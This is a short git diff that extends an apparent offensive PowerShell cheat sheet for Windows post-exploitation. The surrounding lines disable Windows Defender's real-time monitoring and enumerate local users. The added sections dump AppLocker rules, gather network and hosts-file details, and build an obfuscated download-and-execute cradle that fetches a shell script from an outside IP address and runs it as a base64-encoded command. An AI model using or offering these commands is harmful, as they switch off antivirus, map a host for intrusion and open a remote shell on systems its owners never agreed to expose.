@@ -22,3 +22,21 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Get-LocalUser | ft Name,Enabled,Description,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 ```
+### AppLockerPolicy
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+```
+### Network
+```
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+Get-Content C:\WINDOWS\System32\drivers\etc\hosts
+```
+### Download & Execute
+```
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.99.110/shell123.ps1')" | iconv -t UTF-16LE | base64 -w 0
+powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
+
+```
